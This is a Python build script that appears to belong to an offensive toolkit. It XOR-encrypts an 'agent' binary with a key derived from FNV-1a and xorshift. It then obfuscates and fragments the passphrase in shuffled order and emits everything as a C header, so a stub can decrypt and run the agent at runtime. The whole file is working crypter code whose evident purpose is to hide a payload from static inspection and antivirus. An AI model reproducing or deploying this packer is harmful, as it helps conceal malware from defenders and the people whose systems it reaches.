#!/usr/bin/env python3
"""gen_stub_payload.py — Encrypt agent binary and generate stub_payload.h

Usage:
    python3 gen_stub_payload.py <agent_binary>

Generates stub_payload.h in the same directory as this script.
The stub.c includes this header and decrypts the agent at runtime.

Encryption:
    1. Generate random passphrase (32 bytes) and salt (16 bytes)
    2. Derive XOR key via FNV-1a 64-bit + xorshift64 expansion
    3. XOR-encrypt the agent binary
    4. Obfuscate passphrase: XOR each byte with (0x37 + i*13) & 0xFF
    5. Fragment passphrase into 4×8 byte chunks, store in shuffled order [2,0,3,1]
    6. Write everything to stub_payload.h as C arrays
"""

import os
import sys
import struct

KEY_LEN = 32
SALT_LEN = 16
PASS_LEN = 32


def die(msg):
    print(f"[-] {msg}", file=sys.stderr)
    sys.exit(1)


def fnv1a_xorshift_kdf(passphrase, salt, key_len):
    """Derive a key from passphrase + salt using FNV-1a 64-bit + xorshift64."""
    state = 0xCBF29CE484222325
    mask = 0xFFFFFFFFFFFFFFFF

    for b in passphrase:
        state ^= b
        state = (state * 0x100000001B3) & mask
    for b in salt:
        state ^= b
        state = (state * 0x100000001B3) & mask

    key = bytearray()
    for _ in range(key_len):
        state ^= (state << 13) & mask
        state ^= (state >> 7)
        state ^= (state << 17) & mask
        state &= mask
        key.append(state & 0xFF)

    return bytes(key)


def obfuscate_passphrase(passphrase):
    """XOR-obfuscate and fragment the passphrase.
    Returns 4 fragments in shuffled order [2, 0, 3, 1]."""
    obf = bytearray(passphrase)
    for i in range(len(obf)):
        obf[i] ^= (0x37 + i * 13) & 0xFF

    frags = [bytes(obf[i * 8:(i + 1) * 8]) for i in range(4)]
    order = [2, 0, 3, 1]
    return [frags[idx] for idx in order]


def bytes_to_c_array(data):
    """Convert bytes to C initializer: 0x41,0x42,..."""
    return ",".join(f"0x{b:02X}" for b in data)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <agent_binary>")
        sys.exit(1)

    agent_path = sys.argv[1]
    if not os.path.isfile(agent_path):
        die(f"File not found: {agent_path}")

    # Read agent
    with open(agent_path, "rb") as f:
        agent_data = f.read()
    agent_size = len(agent_data)

    # Generate random passphrase and salt
    passphrase = os.urandom(PASS_LEN)
    salt = os.urandom(SALT_LEN)

    # Derive key
    key = fnv1a_xorshift_kdf(passphrase, salt, KEY_LEN)

    # Encrypt
    encrypted = bytes(agent_data[i] ^ key[i % KEY_LEN] for i in range(agent_size))

    # Obfuscate passphrase into fragments
    fragments = obfuscate_passphrase(passphrase)

    # Output path: same directory as this script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(script_dir, "stub_payload.h")

    with open(out_path, "w") as f:
        f.write("/* stub_payload.h — Auto-generated. Do not edit. */\n")
        f.write(f"/* Agent: {os.path.basename(agent_path)} ({agent_size} bytes, encrypted) */\n\n")

        f.write(f"#define STUB_KEY_LEN  {KEY_LEN}\n")
        f.write(f"#define STUB_SALT_LEN {SALT_LEN}\n")
        f.write(f"#define STUB_PASS_LEN {PASS_LEN}\n\n")

        f.write(f"static const unsigned char stub_salt[{SALT_LEN}] = {{{bytes_to_c_array(salt)}}};\n\n")

        for i, frag in enumerate(fragments):
            f.write(f"static const unsigned char stub_pass_frag{i}[8] = {{{bytes_to_c_array(frag)}}};\n")
        f.write("\n")

        f.write(f"static unsigned char stub_payload[] = {{")
        for i, b in enumerate(encrypted):
            if i % 16 == 0:
                f.write("\n  ")
            f.write(f"0x{b:02x}")
            if i < agent_size - 1:
                f.write(",")
        f.write("\n};\n")
        f.write(f"static unsigned int stub_payload_len = {agent_size};\n")

    print(f"[+] {out_path} ({agent_size} bytes, key={key.hex()[:16]}...)")


if __name__ == "__main__":
    main()
